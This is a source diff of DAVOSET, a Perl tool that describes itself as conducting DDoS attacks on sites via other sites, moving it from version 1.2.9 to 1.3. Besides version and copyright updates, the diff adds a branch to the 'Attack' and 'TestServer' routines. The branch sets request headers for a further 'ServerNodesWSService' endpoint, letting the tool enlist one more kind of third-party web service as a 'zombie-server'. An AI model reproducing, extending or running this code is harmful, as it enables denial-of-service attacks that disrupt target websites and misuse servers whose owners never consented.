@@ -1,13 +1,13 @@
 #!/usr/bin/perl
 # DDoS attacks via other sites execution tool
-# DAVOSET v.1.2.9
+# DAVOSET v.1.3
 # Tool for conducting of DDoS attacks on the sites via other sites
-# Copyright (C) MustLive 2010-2016
-# Last update: 30.11.2016
+# Copyright (C) MustLive 2010-2017
+# Last update: 09.03.2017
 # http://websecurity.com.ua
 #############################################
 # Settings
-my $version = "1.2.9"; # program version
+my $version = "1.3"; # program version
 my $agent = "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1)"; # user agent
 my $default_port = "80"; # default port of the host
 my $show_stat = 1; # show statistic of work
@@ -152,7 +152,7 @@ sub Info { # info
 	print qq~
 DDoS attacks via other sites execution tool
 DAVOSET v.$version
-Copyright (C) MustLive 2010-2016
+Copyright (C) MustLive 2010-2017
 
 ~;
 }
@@ -238,6 +238,9 @@ sub Attack { # send request to zombie-server
 		if ($url =~ /xmlpserver/) {
 			print $sock "Content-Type: text/xml;charset=UTF-8\n";
 			print $sock "SOAPAction: \#replyToXML\n";
+		}
+		elsif ($url =~ /ServerNodesWSService/) {
+			print $sock "Content-Type: text/xml\n";
 		}
 		else {
 			print $sock "User-Agent: $agent\n";
@@ -390,6 +393,9 @@ sub TestServer { # test zombie-server
 		if ($url =~ /xmlpserver/) {
 			print $sock "Content-Type: text/xml;charset=UTF-8\n";
 			print $sock "SOAPAction: \#replyToXML\n";
+		}
+		elsif ($url =~ /ServerNodesWSService/) {
+			print $sock "Content-Type: text/xml\n";
 		}
 		else {
 			print $sock "User-Agent: $agent\n";
